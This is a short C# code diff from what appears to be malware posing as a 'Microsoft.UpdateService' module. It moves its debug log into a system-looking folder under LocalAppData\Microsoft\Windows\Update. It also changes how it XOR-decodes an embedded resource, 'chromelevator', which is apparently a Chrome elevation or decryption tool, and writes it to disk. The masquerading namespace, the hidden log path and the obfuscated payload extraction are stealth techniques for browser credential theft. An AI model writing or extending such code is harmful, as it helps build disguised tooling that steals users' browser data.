@@ -24,7 +24,10 @@ namespace Microsoft.UpdateService.Modules
         {
             string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
             Console.WriteLine(line);
-            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", line + "\n"); } catch { }
+            string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
+            if (!Directory.Exists(logDir)) try { Directory.CreateDirectory(logDir); } catch { }
+            string logPath = Path.Combine(logDir, "svc_debug.log");
+            try { File.AppendAllText(logPath, line + "\n"); } catch { }
         }
 
         private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
@@ -238,7 +241,7 @@ namespace Microsoft.UpdateService.Modules
                         using MemoryStream ms = new MemoryStream();
                         stream.CopyTo(ms);
                         byte[] bytes = ms.ToArray();
-                        for (int i = 0; i < bytes.Length; i++) bytes[i] ^= 0xAA;
+                        for (int i = 0; i < bytes.Length; i++) bytes[i] ^= VanguardCore.Constants.RESOURCE_XOR_KEY;
                         File.WriteAllBytes(elevatorPath, bytes);
                         Log($"Extracted chromelevator ({bytes.Length / 1024} KB) to: {elevatorPath}");
                     }
